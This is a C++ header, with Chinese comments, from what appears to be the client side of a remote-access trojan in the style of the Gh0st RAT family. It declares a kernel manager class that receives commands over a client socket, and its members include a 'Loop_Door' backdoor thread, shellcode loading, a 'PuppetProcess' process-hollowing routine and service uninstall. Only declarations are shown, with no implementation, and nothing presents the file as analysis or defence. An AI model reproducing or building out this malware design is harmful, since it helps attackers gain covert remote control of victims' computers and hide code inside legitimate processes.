#pragma once
#include "../../PublicInclude/Manager.h"



class CKernelManager : public CManager  
{
public:
	CKernelManager(CClientSocket* pClient, MODIFY_DATA m_data);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);			//功能判断
	bool	IsActived();								//判断是否激活
	static  MODIFY_DATA modify_data;
	bool	m_bIsActived;
private:
	HANDLE	m_hThread[1000]; // 足够用了
	UINT	m_nThreadCount;
private: //自定义的功能函数
	void	UnInstallService(MODIFY_DATA modify_data);				//卸载
	void EditMark(LPBYTE buff);										//修改备注
	static BOOL WINAPI Loop_Door(LPVOID lparam);         
	static BOOL WINAPI Loop_Updata(LPVOID lparam);
	static BOOL LoadFromShellcode(LPVOID data, MODIFY_DATA modify_data, LPBYTE lpBuffer);
	static BOOL PuppetProcess(TCHAR* pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize);
};
